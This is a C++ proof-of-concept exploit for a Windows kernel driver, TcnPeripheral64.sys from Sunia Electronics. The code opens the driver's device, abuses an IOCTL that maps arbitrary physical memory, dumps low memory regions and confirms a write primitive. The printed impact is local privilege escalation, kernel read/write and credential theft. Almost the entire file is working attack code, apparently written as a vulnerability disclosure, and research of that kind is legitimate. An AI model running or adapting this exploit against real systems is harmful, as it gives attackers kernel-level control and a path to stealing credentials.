/*
 * TcnPeripheral64.sys Arbitrary Physical Memory Read/Write PoC
 * 
 * Vendor: Sunia Electronics
 * Driver: TcnPeripheral64.sys v1.0.7.2
 * SHA256: fa4e294b11e613a27722559b043637bd4d0af5603ab7e8c7970caffd96cf7247
 * 
 * Author: b3s3da
 * Date: 2026-01-22
 */

#include <windows.h>
#include <iostream>
#include <vector>
#include <iomanip>
#include <string>

#define IOCTL_MAP_PHYSICAL_MEMORY 0x4002848

#pragma pack(push, 1)
struct MapRequest {
    uint64_t Size;
    uint64_t PhysicalAddress;
    uint64_t Reserved[3];
};

struct MapResponse {
    uint64_t Unknown1;
    uint64_t Unknown2;
    uint64_t SectionHandle;
    void*    MappedAddress;
    uint64_t Object;
};
#pragma pack(pop)

class PhysicalMemory {
    HANDLE hDevice = INVALID_HANDLE_VALUE;

public:
    bool Open() {
        const char* devices[] = {
            "\\\\.\\SPBTESTTOOL",
            "\\\\.\\TcnPeripheral",
            "\\\\.\\TcnPeripheral0",
        };

        for (const char* dev : devices) {
            hDevice = CreateFileA(dev, GENERIC_READ | GENERIC_WRITE,
                0, NULL, OPEN_EXISTING, 0, NULL);
            if (hDevice != INVALID_HANDLE_VALUE) {
                std::cout << "[+] Opened: " << dev << std::endl;
                return true;
            }
        }
        return false;
    }

    void Close() {
        if (hDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(hDevice);
            hDevice = INVALID_HANDLE_VALUE;
        }
    }

    void* Map(uint64_t physAddr, uint64_t size) {
        MapRequest req = {};
        req.PhysicalAddress = physAddr;
        req.Size = size;

        MapResponse resp = {};
        DWORD bytes = 0;

        if (DeviceIoControl(hDevice, IOCTL_MAP_PHYSICAL_MEMORY,
            &req, sizeof(req), &resp, sizeof(resp), &bytes, NULL)) {
            return resp.MappedAddress;
        }
        return nullptr;
    }

    bool Read(uint64_t physAddr, void* buffer, size_t size) {
        void* mapped = Map(physAddr, size);
        if (!mapped) return false;
        memcpy(buffer, mapped, size);
        return true;
    }
};

void HexDump(const uint8_t* data, size_t size) {
    for (size_t i = 0; i < size; i++) {
        printf("%02X ", data[i]);
    }
}

int main() {
    std::cout << "\n";
    std::cout << "==============================================\n";
    std::cout << " TcnPeripheral64.sys Physical Memory R/W PoC\n";
    std::cout << " Vendor: Sunia Electronics\n";
    std::cout << " Author: b3s3da | 2026\n";
    std::cout << "==============================================\n\n";

    PhysicalMemory phys;

    std::cout << "[*] Opening driver...\n";
    if (!phys.Open()) {
        std::cerr << "[-] Failed to open driver!\n";
        std::cerr << "    Make sure the driver is installed.\n";
        system("pause");
        return 1;
    }

    // Test READ
    std::cout << "\n[*] Testing READ primitive...\n\n";

    struct { uint64_t addr; const char* desc; } tests[] = {
        { 0x0,     "IVT (Interrupt Vector Table)" },
        { 0x1000,  "Low Memory" },
        { 0x7C00,  "Boot Sector Load Address" },
        { 0x9FC00, "Extended BIOS Data Area" },
    };

    for (const auto& t : tests) {
        uint8_t buf[16];
        if (phys.Read(t.addr, buf, sizeof(buf))) {
            std::cout << "  [+] 0x" << std::hex << t.addr << " (" << t.desc << ")\n";
            std::cout << "      ";
            HexDump(buf, 16);
            std::cout << "\n";
        } else {
            std::cout << "  [-] 0x" << std::hex << t.addr << " - FAILED\n";
        }
    }

    // Test WRITE
    std::cout << "\n[*] Testing WRITE primitive...\n\n";

    uint64_t testAddr = 0x5000;
    void* mapped = phys.Map(testAddr, 0x100);

    if (mapped) {
        uint8_t* ptr = (uint8_t*)mapped;
        uint8_t original[4];
        
        memcpy(original, ptr, 4);
        std::cout << "  Original @ 0x" << std::hex << testAddr << ": ";
        HexDump(original, 4);
        std::cout << "\n";

        uint8_t pattern[] = { 0xDE, 0xAD, 0xBE, 0xEF };
        memcpy(ptr, pattern, 4);

        uint8_t verify[4];
        memcpy(verify, ptr, 4);
        std::cout << "  Written:              ";
        HexDump(verify, 4);
        std::cout << "\n";

        memcpy(ptr, original, 4);
        std::cout << "  Restored original\n";

        if (memcmp(verify, pattern, 4) == 0) {
            std::cout << "\n  [+] WRITE PRIMITIVE CONFIRMED!\n";
            std::cout << "  [!] Arbitrary physical memory R/W achieved!\n";
        }
    } else {
        std::cout << "  [-] Failed to map memory for write test\n";
    }

    std::cout << "\n==============================================\n";
    std::cout << " Impact: LPE, Kernel R/W, Credential Theft\n";
    std::cout << "==============================================\n\n";

    phys.Close();
    system("pause");
    return 0;
}
